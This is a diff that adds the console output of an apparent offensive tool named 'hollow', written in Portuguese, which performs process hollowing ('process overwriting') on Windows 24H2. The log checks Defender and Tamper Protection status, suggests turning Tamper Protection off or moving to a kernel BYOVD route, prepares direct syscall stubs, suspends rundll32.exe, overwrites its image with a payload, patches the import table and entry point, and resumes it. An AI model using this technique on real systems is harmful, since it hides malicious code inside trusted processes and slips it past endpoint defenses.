@@ -1,0 +1,19 @@
+hollow — process overwriting (24H2-safe)
+  host    : (auto)
+  payload : C:\lab\payload.exe
+  admin   : sim
+  tamper  : LIGADO
+  winDefnd: rodando | realtime: on
+[!] Tamper Protection LIGADO: escritas no Defender serao negadas.
+    Desligue em Seguranca do Windows > Protecao contra violacoes,
+    ou va de via kernel (BYOVD) — userland nao passa daqui.
+[*] syscalls: 7 stubs | gadget=00007FFDA245E9A2
+[*] payload: SizeOfImage=20480 entry=+0x103b sections=4
+[*] host escolhido: C:\Windows\System32\rundll32.exe (imagem 90112 >= 20480)
+[*] host suspenso pid=4112
+[*] host ImageBase=00007FF7DCDF0000
+[*] imagem sobrescrita (paginas seguem MEM_IMAGE)
+[*] KERNEL32.dll nao esta mapeada no alvo, carregando
+[*] IAT do payload preenchida
+[*] entry ajustado manualmente (Rip != LdrInitializeThunk)
+[*] thread liberada — payload em execucao
